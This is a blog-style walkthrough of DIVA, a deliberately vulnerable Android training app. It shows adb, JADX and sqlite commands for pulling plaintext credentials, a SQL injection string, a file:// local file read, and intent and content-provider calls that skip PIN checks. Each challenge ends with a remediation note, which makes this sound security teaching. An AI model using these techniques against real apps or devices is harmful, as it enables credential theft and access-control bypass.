---
title: "Android Security Lab: DIVA Walkthrough"
date: 2026-02-09 18:00:00 +0000
categories: [Android, Mobile Security]
tags: [android, diva, insecure-storage, hardcoded-secrets, sql-injection, access-control, mobile-pentesting]
image:
  path: /assets/diva/cover.png
---

## 📱 Application Overview

- **Name:** DIVA (Damn Insecure and Vulnerable App)  
- **Platform:** Android  
- **Category:** Mobile Application Security  
- **Focus Areas:** Insecure Logging, Hardcoded Secrets, Insecure Storage, Input Validation, Access Control  

DIVA is a deliberately vulnerable Android application designed to demonstrate common mobile security flaws based on OWASP Mobile Top 10.  

In this walkthrough, I exploited multiple vulnerabilities including:

- Insecure logging
- Hardcoded secrets
- Insecure local storage (SharedPreferences, SQLite, Files, SDCard)
- SQL Injection
- Content Provider abuse
- Activity exploitation via ADB
- Native library secret extraction
- Input validation flaws

---
![Desktop View](/assets/diva/1.png){: width="700" height="400" .normal }

# 🔎 Challenge 1 — Insecure Logging

## 0x01: Capturing Application Logs

First, I obtained the process ID (PID) of the running application:
![Desktop View](/assets/diva/2.png){: width="700" height="400" .normal }

```bash
adb shell
ps | grep diva
```
![Desktop View](/assets/diva/3.png){: width="700" height="400" .normal }

After identifying the PID, I captured logs for that specific process:

```shell
adb logcat --pid=<PID>
```
![Desktop View](/assets/diva/5.png){: width="700" height="400" .normal }

When entering sensitive input inside the app, the data appeared directly in logcat.

⚠️ Impact: Sensitive information should never be logged in production builds. Attackers with physical or debugging access can retrieve secrets.

## 🔐 Challenge 2 — Hardcoding Issue (Part 1)

Using JADX to decompile the APK:

```shell
jadx diva.apk
```
![Desktop View](/assets/diva/7.png){: width="700" height="400" .normal }

I searched for keywords such as:

secret

key

pass

password

Inside the HardcodeActivity, I found a vendor key hardcoded directly in the source code.

![Desktop View](/assets/diva/8.png){: width="700" height="400" .normal }

⚠️ Impact: Hardcoded secrets can be extracted easily via reverse engineering.

## 💾 Challenge 3 — Insecure Data Storage (Part 1)


Credentials were stored in plaintext XML. 

![Desktop View](/assets/diva/9.png){: width="700" height="400" .normal }

After saving credentials inside the app:


```shell
adb shell
cd /data/data/jakhar.aseem.diva/
```

Navigating to:

```shell
cd shared_prefs
cat jakhar.aseem.diva_preferences.xml
```
Or  u can use MTmanger for easy way 

![Desktop View](/assets/diva/10.png){: width="700" height="400" .normal }

![Desktop View](/assets/diva/11.png){: width="700" height="400" .normal }

![Desktop View](/assets/diva/12.png){: width="700" height="400" .normal }

⚠️ Impact: SharedPreferences should be encrypted when storing sensitive data.

## 🗄 Challenge 4 — Insecure Data Storage (Part 2)
By analyzing InsecureDataStorage2Activity in JADX, I discovered credentials were stored in a SQLite 

![Desktop View](/assets/diva/13.png){: width="700" height="400" .normal }

database named:

```python
ids2
```

Extracting data:

```shell
adb shell
cd /data/data/jakhar.aseem.diva/databases
sqlite3 ids2
.tables
SELECT * FROM <table_name>;
```
![Desktop View](/assets/diva/14.png){: width="700" height="400" .normal }

Plaintext credentials were retrieved.

⚠️ Impact: Sensitive data must never be stored unencrypted inside SQLite databases.

## 📁 Challenge 5 — Insecure Data Storage (Part 3)
same as challange 4 but 
Code analysis revealed a temporary file created: uinfoXXXXtmp

Accessed via:

```shell
cd /data/data/jakhar.aseem.diva/
cat uinfoXXXXtmp
```

Credentials were stored inside the file.

⚠️ Impact: Temporary files may leak secrets if not securely handled.

## 📂 Challenge 6 — Insecure Data Storage (Part 4)

same as challange 4 but Decompiled code showed credentials being written to:

```shell
/sdcard/.uinfo.txt
```

Listing hidden files:
```shell
cd /sdcard
ls -lah
```

The hidden file .uinfo.txt contained sensitive information.

⚠️ Impact: External storage is globally readable on many Android versions.

## 💉 Challenge 7 — Input Validation Issue (Part 1)
The search functionality did not sanitize input.

Testing SQL injection:
```shell
' OR '1'='1
```

![Desktop View](/assets/diva/15.png){: width="700" height="400" .normal }

The app returned all user records.

⚠️ Impact: Improper input validation → SQL Injection.

## 🌐 Challenge 8 — Input Validation Issue (Part 2)
The app loaded user-supplied URLs.

By using:
```shell
file:///sdcard/DIVA-sens-info.txt
```

I was able to read local files from the device.

⚠️ Impact: WebView improperly configured → Local File Inclusion (LFI).

## 🚪 Challenge 9 — Access Control Issue (Part 1)
Clicking "View API Credentials" triggered:

jakhar.aseem.diva/.APICredsActivity

I launched it directly:
```shell
adb shell am start -n jakhar.aseem.diva/.APICredsActivity
```

Credentials were revealed without using the UI button.

![Desktop View](/assets/diva/16.png){: width="700" height="400" .normal }

⚠️ Impact: Exported activities without proper permission checks.

## 🔓 Challenge 10 — Access Control Issue (Part 2)
Decompiled APICreds2Activity revealed a boolean check:

check_pin
![Desktop View](/assets/diva/17.png){: width="700" height="400" .normal }

Launching with extra parameter:

```shell
adb shell am start \
-n jakhar.aseem.diva/.APICreds2Activity \
-a jakhar.aseem.diva.action.VIEW_CREDS2 \
--ez check_pin false
```
![Desktop View](/assets/diva/18.png){: width="700" height="400" .normal }

Bypassing the PIN validation allowed retrieval of API credentials.

⚠️ Impact: Improper intent validation allows authentication bypass.

# 🔐 Challenge 11 — Access Control Issue (Part 3)

## 🎯 Objective

Retrieve private notes **without knowing the 4-digit PIN** by abusing an exposed Content Provider.

---

## 📱 Application Behavior

This challenge allows the user to:

1. Create a 4-digit PIN
2. Protect private notes with that PIN
3. Enter the correct PIN to view notes

When the correct PIN is entered, the app displays the hidden notes.

---

## 🔎 0x01: Source Code Analysis

### PIN Creation Logic

```java
spedit.putString(getString(R.string.pkey), pin);
spedit.commit();
The PIN is stored inside SharedPreferences.

PIN Verification Logic
if (userpin.equals(pin)) {
    Cursor cr = getContentResolver().query(
        NotesProvider.CONTENT_URI,
        new String[]{"_id", "title", "note"},
        null, null, null
    );
```

Here’s what happens:

The app compares userpin with stored pin

If correct → it queries the Content Provider

Then displays the notes in a ListView

So the real data source is not the Activity — it is the Content Provider.

🧠 0x02: Identifying the Content Provider
Clicking NotesProvider.CONTENT_URI leads to:

```java
static final Uri CONTENT_URI = 
Uri.parse("content://jakhar.aseem.diva.provider.notesprovider/notes");
```

The URI is hardcoded inside the source code.

This means:

If the provider is exported and not permission-protected, we can call it directly.

🚨 0x03: Exploitation — Direct Content Provider Query
Instead of entering the PIN, we directly query the provider using ADB:

```shell
adb shell content query \
--uri content://jakhar.aseem.diva.provider.notesprovider/notes
```

💥 Result
![Desktop View](/assets/diva/20.png){: width="700" height="400" .normal }

The notes are returned instantly — without entering the PIN.

Bingo ✅



## 🧠 Final Thoughts
DIVA perfectly demonstrates common mobile security failures:

Logging sensitive information

Hardcoded secrets (Java & Native)

Plaintext credential storage

SQL Injection

WebView file access abuse

Exported activity exploitation

Content Provider misconfiguration

Input validation failures

## 🔥 Key Takeaway
Mobile applications must implement:

Proper encryption for stored data

Secure intent validation

Strict input sanitization

Removal of debug logs

Secure WebView configuration

Proper component export restrictions

DIVA proves one important lesson:

If attackers can reverse it, they can break it.

Happy Hacking 👾

---
